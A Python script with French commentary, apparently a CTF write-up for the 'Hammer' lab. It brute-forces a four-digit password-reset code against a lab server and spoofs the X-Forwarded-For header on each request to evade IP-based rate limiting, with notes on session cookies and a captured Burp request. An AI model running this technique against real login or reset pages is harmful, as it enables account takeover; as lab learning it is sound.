import requests

BASE = "http://10.10.64.149:1337/reset_password.php"
PHPSESSID = "blablabla, c'est nouveau à chaque fois (prends le sur Burp)"   # prends-le juste après avoir demandé le reset et input un PIN aléatoire
TIMEOUT = 5.0
TOTAL = 10000

sess = requests.Session()
sess.headers.update({"User-Agent": "BonjourOuiVousPouvezMettreQueVousVoulezIci"})
sess.cookies.set("PHPSESSID", PHPSESSID)

for i in range(TOTAL):
    code = f"{i:04d}"
    data = {"recovery_code": code, "s": "180"} #Attention, ça c'est les champs spécifiques pour ce site, donc à modifier en fonction.   
    headers = {"X-Forwarded-For": f"10.0.{i//256}.{i%256}"}
    try:
        r = sess.post(BASE, data=data, headers=headers, timeout=TIMEOUT)
    except requests.RequestException:
        continue

    if "Invalid" not in r.text and "error=" not in r.url:   #à modifier bien sûr, en fonction du message d'erreur reçu lorsque nous mettons un OTP mauvais. 
        print(f"\n[HIT] code={code}")
        print(r.text[:500])
        break

    if i % 100 == 0:
        percent = (i / TOTAL) * 100
        print(f"[*] Progress: {percent:.1f}% ({i}/{TOTAL})", end="\r")


"""
Ok, nous avons raté précédemment mais cette fois-ci cela marche. 

Ce script a été utilisé pour le CTF Hammer (encore). Après avoir bruteforce les directory avec 
"hmr_" au jour 30, nous accédons à un fichier nous indiquant une adresse mail valide : tester@hammer.thm. 
N'ayant pas de mot de passe, nous avons essayé l'option "Reset your password". Cela vous renvoit vers une 
page vous demandant un code à 4 chiffres, avec une limite de temps de 180 secondes. 

Le jour 31, nous avons essayé de créer un code de brute force pour trouver le code. En effet, comme
le code est à 4 chiffres, il y avait 10 000 possibilités, ce qui était rapide à faire. 

L'objectif étaut donc de créer un code de récupération d'OTP (One Time Password) statique. 

Cependant cela ne marchait pas car le site avait implémenté un rate limiter, ce qui m'avait bloqué 
le premier jour. Pour contourner cela, il fallait réunir 3 choses dans le script : 

1) PHPSESSID : le cookie de session PHP.
Lorsque nous accédons à une page PHP qui gère des sessions, cela génère un identifiant unique, le PHPSESSID. 
Ce dernier est envoyé au client sous forme de cookie. Sauf que, à chaque requête suivante, le client doit 
renvoyer ce cookie pour prouver que c'est bien encore lui. Bref, c'est une sorte d'identifiant de session. 
Sans lui, ton code ne marchera pas. 

2) X-Forwared-For
C'est un header HTTP ajouté par les proxies ou load balancers pour indiquer l'adresse IP d'origine du client. 
Un exemple simple : si tu utilises un proxy, le serveur web ne verra que l'IP du proxy. Mais, ce dernier peut 
ajouter un X-Forwarded-For : 10.10.255.255, ce qui signifie que la vraie IP client est (...)
Or, comme dit précédemment, le serveur faisait du rate limiting, bloquant nos tentatives de brute force après 
une centaine de requetes. 
Nous avons émis l'hypothèse aujourd'hui que le serveur effectue le blocage en se basant sur l'IP. C'est la raison
pour laquelle nous avons essayé de changer le X-Forwared-For à chaque tentative pour faire croire au serveur que 
chaque requête vient d'une nouvelle IP, donc d'un nouvel utilisateur. 
Note : si cela ne marchait pas, nous aurions essayé de randomiser l'User-Agent. Une autre piste pourrait être la 
timezone etc etc...

3) data = {"recovery_code": code, "s": "180"}
Cette partie n'avait pas posé problème mais il est utile de développer dessus. 
Rappelons que notre script effectue un POST vers reset_password.php. Il faut donc désigner les données à envoyer. 

Pour nous assurer de la validité de la requête, nous avons capturé une partie de l'output sur Burp : 

Referer: http://10.10.64.149:1337/reset_password.php
Cookie: PHPSESSID=gbee4vhcavjudmu7lm1kve1qag
Upgrade-Insecure-Requests: 1
Priority: u=0, i

recovery_code=1111&s=12


Cela nous donne le PHPSESSID et surtout "recovery_code=1111&s=12". 
recovery_code étant le PIN aléatoire que nous avons essayé et s étant le temps qu'il nous reste. 
Cet output de Burp nous apprend que le serveur attend ces deux paramètres. 


Autres : 
-f"{i:04d}". 
C'était l'occasion d'utiliser un f string. 
0 : ajoute des zéros si besoin
4 : le nombre de caractères total
d : décimal. 

Cela génère un code PIN de 0000 à 9999. Une boucle while ordinaire donnera : 
0, 1, 2, 3 etc etc...
Or, nous voulons 0000, 0001, 0002, 0003 etc etc. C'est pourquoi le f string était plus adapté. 

-f"10.0.{i//256}.{i%256}"
Cela permet simplement de randomiser notre IP. Le // est une division et le % est un modulo. Cela permet 
d'avoir des résultats différents mais c'est une manière possible parmi tant d'autres.  
C'était ce que nous avons effectué au début, mais 
ce n'était pas suffisant, il fallait surtout randomiser le X-Forwarded-For. Nous avons gardé les deux 
(random IP, random X-Forwarded-For) par précaution. 


"""